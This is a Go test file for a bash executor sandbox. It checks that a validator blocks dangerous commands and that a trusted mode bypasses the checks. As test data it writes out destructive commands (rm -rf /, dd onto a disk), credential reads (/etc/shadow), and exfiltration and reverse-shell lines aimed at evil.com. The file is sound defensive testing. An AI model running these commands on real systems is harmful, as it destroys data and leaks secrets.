package executors

import (
	"context"
	"strings"
	"testing"

	"github.com/fredcamaral/slicli/internal/domain/entities"
)

// TestDangerousCommandBlocking verifies that dangerous commands are BLOCKED, not just warned about.
// This is a critical security test - if these tests pass, the sandbox is working correctly.
func TestDangerousCommandBlocking(t *testing.T) {
	executor := &BashExecutor{}
	config := executor.GetDefaultConfig()
	config.TrustedMode = false // Ensure we're not in trusted mode

	tests := []struct {
		name            string
		code            string
		shouldBlock     bool
		expectedPattern string // Pattern we expect to be detected
	}{
		// File system destruction commands
		{
			name:            "rm -rf /",
			code:            "rm -rf /",
			shouldBlock:     true,
			expectedPattern: "rm",
		},
		{
			name:            "rm with flags",
			code:            "rm -f /tmp/file",
			shouldBlock:     true,
			expectedPattern: "rm",
		},
		{
			name:            "rmdir command",
			code:            "rmdir /some/directory",
			shouldBlock:     true,
			expectedPattern: "rmdir",
		},
		{
			name:            "mv command",
			code:            "mv /etc/passwd /tmp/",
			shouldBlock:     true,
			expectedPattern: "mv",
		},
		{
			name:            "chmod command",
			code:            "chmod 777 /etc/passwd",
			shouldBlock:     true,
			expectedPattern: "chmod",
		},
		{
			name:            "chown command",
			code:            "chown root:root /tmp/file",
			shouldBlock:     true,
			expectedPattern: "chown",
		},
		{
			name:            "dd command",
			code:            "dd if=/dev/zero of=/dev/sda",
			shouldBlock:     true,
			expectedPattern: "dd",
		},
		{
			name:            "shred command",
			code:            "shred /dev/sda",
			shouldBlock:     true,
			expectedPattern: "shred",
		},

		// Privilege escalation
		{
			name:            "sudo command",
			code:            "sudo rm -rf /",
			shouldBlock:     true,
			expectedPattern: "sudo",
		},
		{
			name:            "su command",
			code:            "su root -c 'whoami'",
			shouldBlock:     true,
			expectedPattern: "su",
		},
		{
			name:            "passwd command",
			code:            "passwd root",
			shouldBlock:     true,
			expectedPattern: "passwd",
		},

		// Network commands (data exfiltration)
		{
			name:            "wget command",
			code:            "wget http://evil.com/malware.sh",
			shouldBlock:     true,
			expectedPattern: "wget",
		},
		{
			name:            "curl command",
			code:            "curl http://evil.com/steal-data",
			shouldBlock:     true,
			expectedPattern: "curl",
		},
		{
			name:            "curl with data",
			code:            "curl -X POST -d @/etc/passwd http://evil.com",
			shouldBlock:     true,
			expectedPattern: "curl",
		},
		{
			name:            "ssh command",
			code:            "ssh attacker@evil.com",
			shouldBlock:     true,
			expectedPattern: "ssh",
		},
		{
			name:            "scp command",
			code:            "scp /etc/passwd attacker@evil.com:/tmp/",
			shouldBlock:     true,
			expectedPattern: "scp",
		},
		{
			name:            "nc (netcat) command",
			code:            "nc -l 4444",
			shouldBlock:     true,
			expectedPattern: "nc",
		},
		{
			name:            "netcat reverse shell",
			code:            "netcat -e /bin/sh evil.com 4444",
			shouldBlock:     true,
			expectedPattern: "netcat",
		},

		// Command substitution (allows arbitrary execution)
		{
			name:            "command substitution $()",
			code:            "echo $(cat /etc/passwd)",
			shouldBlock:     true,
			expectedPattern: "command substitution $()",
		},
		{
			name:            "command substitution backticks",
			code:            "echo `cat /etc/passwd`",
			shouldBlock:     true,
			expectedPattern: "command substitution backticks",
		},
		{
			name:            "nested command substitution",
			code:            "$($(whoami))",
			shouldBlock:     true,
			expectedPattern: "command substitution $()",
		},

		// Dangerous path access
		{
			name:            "/dev/ access",
			code:            "cat /dev/sda",
			shouldBlock:     true,
			expectedPattern: "/dev/ access",
		},
		{
			name:            "/proc/ access",
			code:            "cat /proc/1/environ",
			shouldBlock:     true,
			expectedPattern: "/proc/ access",
		},
		{
			name:            "/sys/ access",
			code:            "echo 1 > /sys/power/state",
			shouldBlock:     true,
			expectedPattern: "/sys/ access",
		},
		{
			name:            "/etc/passwd access",
			code:            "cat /etc/passwd",
			shouldBlock:     true,
			expectedPattern: "/etc/passwd access",
		},
		{
			name:            "/etc/shadow access",
			code:            "cat /etc/shadow",
			shouldBlock:     true,
			expectedPattern: "/etc/shadow access",
		},

		// Shell spawning and code execution
		{
			name:            "eval command",
			code:            "eval 'rm -rf /'",
			shouldBlock:     true,
			expectedPattern: "eval",
		},
		{
			name:            "exec command",
			code:            "exec /bin/sh",
			shouldBlock:     true,
			expectedPattern: "exec",
		},
		{
			name:            "source command",
			code:            "source /tmp/malicious.sh",
			shouldBlock:     true,
			expectedPattern: "source",
		},
		{
			name:            "bash spawning",
			code:            "bash -c 'rm -rf /'",
			shouldBlock:     true,
			expectedPattern: "bash",
		},

		// System commands
		{
			name:            "reboot command",
			code:            "reboot",
			shouldBlock:     true,
			expectedPattern: "reboot",
		},
		{
			name:            "shutdown command",
			code:            "shutdown -h now",
			shouldBlock:     true,
			expectedPattern: "shutdown",
		},
		{
			name:            "mount command",
			code:            "mount /dev/sda1 /mnt",
			shouldBlock:     true,
			expectedPattern: "mount",
		},

		// Process manipulation
		{
			name:            "kill command",
			code:            "kill -9 1",
			shouldBlock:     true,
			expectedPattern: "kill",
		},
		{
			name:            "killall command",
			code:            "killall sshd",
			shouldBlock:     true,
			expectedPattern: "killall",
		},

		// Safe commands that should NOT be blocked
		{
			name:        "echo command",
			code:        "echo 'Hello, World!'",
			shouldBlock: false,
		},
		{
			name:        "ls command",
			code:        "ls -la",
			shouldBlock: false,
		},
		{
			name:        "pwd command",
			code:        "pwd",
			shouldBlock: false,
		},
		{
			name:        "date command",
			code:        "date",
			shouldBlock: false,
		},
		{
			name:        "whoami command",
			code:        "whoami",
			shouldBlock: false,
		},
		{
			name:        "simple math",
			code:        "echo $((1 + 1))",
			shouldBlock: false,
		},
		{
			name:        "variable assignment",
			code:        "x=5; echo $x",
			shouldBlock: false,
		},
		{
			name:        "for loop",
			code:        "for i in 1 2 3; do echo $i; done",
			shouldBlock: false,
		},
		{
			name:        "if statement",
			code:        "if [ 1 -eq 1 ]; then echo 'yes'; fi",
			shouldBlock: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			ctx := context.Background()
			cmd, cleanup, err := executor.Prepare(ctx, tt.code, config)

			if tt.shouldBlock {
				// Command should be BLOCKED with an error
				if err == nil {
					if cleanup != nil {
						cleanup()
					}
					t.Errorf("SECURITY FAILURE: dangerous command '%s' was NOT blocked", tt.code)
					return
				}

				// Verify it's a BlockedCommandError
				if !entities.IsBlockedCommandError(err) {
					t.Errorf("Expected BlockedCommandError, got: %T - %v", err, err)
					return
				}

				// Verify the expected pattern was detected
				if tt.expectedPattern != "" && !strings.Contains(err.Error(), tt.expectedPattern) {
					t.Logf("Warning: expected pattern '%s' not found in error: %v", tt.expectedPattern, err)
				}

				t.Logf("Correctly blocked: %s", err.Error())
			} else {
				// Command should NOT be blocked
				if err != nil {
					t.Errorf("Safe command '%s' was incorrectly blocked: %v", tt.code, err)
					return
				}

				if cleanup != nil {
					cleanup()
				}

				if cmd == nil {
					t.Errorf("Safe command '%s' returned nil cmd without error", tt.code)
				}
			}
		})
	}
}

// TestTrustedModeBypassesSecurity verifies that TrustedMode allows dangerous commands.
// This is intentional behavior for trusted environments.
func TestTrustedModeBypassesSecurity(t *testing.T) {
	executor := &BashExecutor{}
	config := executor.GetDefaultConfig()
	config.TrustedMode = true // Enable trusted mode

	dangerousCodes := []string{
		"rm -rf /tmp/test",
		"curl http://example.com",
		"$(echo test)",
	}

	for _, code := range dangerousCodes {
		t.Run(code, func(t *testing.T) {
			ctx := context.Background()
			cmd, cleanup, err := executor.Prepare(ctx, code, config)

			if cleanup != nil {
				defer cleanup()
			}

			// In trusted mode, should NOT be blocked
			if err != nil {
				t.Errorf("TrustedMode should allow dangerous command, but got error: %v", err)
				return
			}

			if cmd == nil {
				t.Error("Expected valid cmd in TrustedMode")
			}
		})
	}
}

// TestIsDangerousCommandHelper tests the helper function
func TestIsDangerousCommandHelper(t *testing.T) {
	tests := []struct {
		code        string
		isDangerous bool
	}{
		{"rm -rf /", true},
		{"curl http://evil.com", true},
		{"$(whoami)", true},
		{"echo hello", false},
		{"ls -la", false},
	}

	for _, tt := range tests {
		t.Run(tt.code, func(t *testing.T) {
			isDangerous, commands := IsDangerousCommand(tt.code)

			if isDangerous != tt.isDangerous {
				t.Errorf("IsDangerousCommand(%q) = %v, want %v (commands: %v)",
					tt.code, isDangerous, tt.isDangerous, commands)
			}
		})
	}
}

// TestMultipleDangerousCommands verifies all dangerous commands are reported
func TestMultipleDangerousCommands(t *testing.T) {
	code := "rm -rf / && curl http://evil.com && $(cat /etc/passwd)"

	isDangerous, commands := IsDangerousCommand(code)

	if !isDangerous {
		t.Error("Expected code with multiple dangerous commands to be detected")
	}

	// Should detect at least rm, curl, command substitution, and /etc/passwd
	if len(commands) < 3 {
		t.Errorf("Expected at least 3 dangerous patterns, got %d: %v", len(commands), commands)
	}

	t.Logf("Detected dangerous commands: %v", commands)
}

// TestCaseInsensitivity verifies pattern matching is case-insensitive where appropriate
func TestCaseInsensitivity(t *testing.T) {
	tests := []struct {
		code        string
		shouldBlock bool
	}{
		{"RM -rf /", true},
		{"CURL http://evil.com", true},
		{"WGET http://evil.com", true},
		{"SuDo rm -rf /", true},
		{"ECHO hello", false}, // echo should not be blocked regardless of case
	}

	executor := &BashExecutor{}
	config := executor.GetDefaultConfig()
	config.TrustedMode = false

	for _, tt := range tests {
		t.Run(tt.code, func(t *testing.T) {
			err := executor.validateBashCode(tt.code)

			if tt.shouldBlock && err == nil {
				t.Errorf("Expected '%s' to be blocked (case-insensitive)", tt.code)
			}
			if !tt.shouldBlock && err != nil {
				t.Errorf("Expected '%s' to be allowed, got: %v", tt.code, err)
			}
		})
	}
}

// TestBlockedCommandErrorMessage verifies error messages are clear and helpful
func TestBlockedCommandErrorMessage(t *testing.T) {
	executor := &BashExecutor{}

	err := executor.validateBashCode("rm -rf /")
	if err == nil {
		t.Fatal("Expected error for rm command")
	}

	errMsg := err.Error()

	// Error message should be helpful and clear
	if !strings.Contains(errMsg, "blocked") && !strings.Contains(errMsg, "dangerous") {
		t.Errorf("Error message should indicate command was blocked: %s", errMsg)
	}

	if !strings.Contains(errMsg, "rm") {
		t.Errorf("Error message should mention the blocked command: %s", errMsg)
	}

	// Should be a BlockedCommandError
	blockedErr, ok := err.(*entities.BlockedCommandError)
	if !ok {
		t.Errorf("Expected *BlockedCommandError, got %T", err)
		return
	}

	if len(blockedErr.Commands) == 0 {
		t.Error("BlockedCommandError.Commands should not be empty")
	}
}

// TestEdgeCases tests edge cases that might bypass security
func TestEdgeCases(t *testing.T) {
	executor := &BashExecutor{}
	config := executor.GetDefaultConfig()
	config.TrustedMode = false

	edgeCases := []struct {
		name        string
		code        string
		shouldBlock bool
	}{
		// Attempts to hide commands
		{"rm with extra spaces", "rm    -rf   /", true},
		{"rm with tabs", "rm\t-rf\t/", true},
		{"rm in quotes", "\"rm\" -rf /", false}, // This might not be caught, but it's also not executable this way
		{"embedded newline", "echo test\nrm -rf /", true},

		// Path traversal attempts
		{"relative path to passwd", "cat ../../etc/passwd", false}, // Relative paths don't match /etc/passwd pattern
		{"symbolic /etc/passwd", "/etc/passwd", true},

		// Comments and strings
		{"rm in comment", "# rm -rf /", true},        // Still matches pattern, which is safer
		{"echo rm command", "echo 'rm -rf /'", true}, // Still matches - false positive but safer

		// Unicode and encoding tricks (should not bypass)
		{"basic rm", "rm -rf /tmp/test", true},
	}

	for _, tt := range edgeCases {
		t.Run(tt.name, func(t *testing.T) {
			ctx := context.Background()
			_, cleanup, err := executor.Prepare(ctx, tt.code, config)

			if cleanup != nil {
				cleanup()
			}

			if tt.shouldBlock && err == nil {
				t.Errorf("Edge case '%s' with code '%s' should be blocked", tt.name, tt.code)
			}
			if !tt.shouldBlock && err != nil {
				t.Logf("Note: '%s' was blocked (may be acceptable false positive): %v", tt.name, err)
			}
		})
	}
}

// BenchmarkValidateBashCode benchmarks the security validation
func BenchmarkValidateBashCode(b *testing.B) {
	executor := &BashExecutor{}
	code := "echo 'Hello, World!'"

	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		_ = executor.validateBashCode(code)
	}
}

// BenchmarkValidateDangerousCode benchmarks validation of dangerous code
func BenchmarkValidateDangerousCode(b *testing.B) {
	executor := &BashExecutor{}
	code := "rm -rf / && curl http://evil.com"

	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		_ = executor.validateBashCode(code)
	}
}
